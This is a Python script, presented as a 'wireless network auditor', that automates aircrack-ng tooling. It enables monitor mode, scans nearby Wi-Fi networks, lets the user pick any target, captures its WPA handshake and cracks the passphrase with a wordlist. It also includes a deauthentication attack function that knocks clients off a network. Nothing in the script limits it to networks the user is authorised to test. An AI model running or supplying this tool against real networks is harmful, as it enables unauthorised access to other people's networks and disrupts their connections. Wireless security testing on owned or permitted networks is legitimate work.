#!/usr/bin/env python3
import subprocess
import argparse
import time
import os
import sys
from colorama import Fore, Style

# Check if running as root
if os.geteuid() != 0:
    sys.exit(f"{Fore.RED}Error: This script requires root privileges. Use sudo.{Style.RESET_ALL}")

def enable_monitor_mode(interface):
    """Enable monitor mode on wireless interface"""
    try:
        subprocess.run(['airmon-ng', 'check', 'kill'], check=True)
        subprocess.run(['ip', 'link', 'set', interface, 'down'], check=True)
        subprocess.run(['iw', interface, 'set', 'monitor', 'control'], check=True)
        subprocess.run(['ip', 'link', 'set', interface, 'up'], check=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error setting monitor mode: {e}{Style.RESET_ALL}")
        return False

def scan_networks(interface, timeout=10):
    """Scan for nearby wireless networks"""
    print(f"{Fore.CYAN}\n[+] Scanning networks for {timeout} seconds...{Style.RESET_ALL}")
    
    try:
        scan = subprocess.Popen(['airodump-ng', interface], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE,
                               text=True)
        time.sleep(timeout)
        scan.terminate()
        stdout, _ = scan.communicate()
        return parse_networks(stdout)
    except Exception as e:
        print(f"{Fore.RED}Scanning error: {e}{Style.RESET_ALL}")
        return []

def parse_networks(scan_output):
    """Parse airodump-ng output"""
    networks = []
    lines = scan_output.split('\n')
    
    for line in lines:
        if 'BSSID' in line:
            continue
            
        parts = line.strip().split()
        if len(parts) >= 13:
            networks.append({
                'bssid': parts[0],
                'channel': parts[5],
                'encryption': ' '.join(parts[10:-2]),
                'essid': ' '.join(parts[13:])
            })
    
    return networks

def deauth_attack(interface, bssid, client, count=3):
    """Perform deauthentication attack"""
    print(f"{Fore.YELLOW}\n[+] Starting deauthentication attack...{Style.RESET_ALL}")
    try:
        subprocess.run([
            'aireplay-ng',
            '--deauth', str(count),
            '-a', bssid,
            '-c', client,
            interface
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Deauth attack failed: {e}{Style.RESET_ALL}")

def capture_handshake(interface, bssid, channel, output_file):
    """Capture WPA handshake"""
    print(f"{Fore.CYAN}\n[+] Starting handshake capture...{Style.RESET_ALL}")
    try:
        dump = subprocess.Popen([
            'airodump-ng',
            '-c', channel,
            '--bssid', bssid,
            '-w', output_file,
            interface
        ])
        
        # Wait for handshake
        while True:
            time.sleep(5)
            if check_handshake(output_file + '-01.cap'):
                dump.terminate()
                return True
    except Exception as e:
        print(f"{Fore.RED}Handshake capture failed: {e}{Style.RESET_ALL}")
        return False

def check_handshake(cap_file):
    """Check capture file for handshake"""
    try:
        result = subprocess.run(['tshark', '-r', cap_file, '-Y', 'eapol'], 
                               capture_output=True, text=True)
        return 'EAPOL' in result.stdout
    except:
        return False

def main():
    parser = argparse.ArgumentParser(description='PyWiAudit - Wireless Network Auditor')
    parser.add_argument('-i', '--interface', required=True, help='Wireless interface')
    parser.add_argument('-w', '--wordlist', help='Wordlist path for cracking')
    args = parser.parse_args()

    print(f"{Fore.GREEN}\nPyWiAudit - Wireless Network Auditor{Style.RESET_ALL}")
    
    if not enable_monitor_mode(args.interface):
        return
    
    networks = scan_networks(args.interface)
    
    print(f"\n{Fore.WHITE}Available Networks:{Style.RESET_ALL}")
    for idx, net in enumerate(networks, 1):
        print(f"{idx}. {net['essid']} ({net['bssid']}) - {net['encryption']}")
    
    try:
        choice = int(input("\nSelect target network: ")) - 1
        target = networks[choice]
    except:
        print(f"{Fore.RED}Invalid selection{Style.RESET_ALL}")
        return
    
    output_file = f"capture_{target['bssid'].replace(':', '')}"
    
    if capture_handshake(args.interface, target['bssid'], target['channel'], output_file):
        print(f"{Fore.GREEN}\n[+] Handshake captured! Saved as {output_file}-01.cap{Style.RESET_ALL}")
        
        if args.wordlist:
            print(f"{Fore.CYAN}\n[+] Starting cracking process...{Style.RESET_ALL}")
            subprocess.run([
                'aircrack-ng',
                '-w', args.wordlist,
                '-b', target['bssid'],
                output_file + '-01.cap'
            ])
    else:
        print(f"{Fore.RED}\n[-] Failed to capture handshake{Style.RESET_ALL}")

if __name__ == '__main__':
    main()
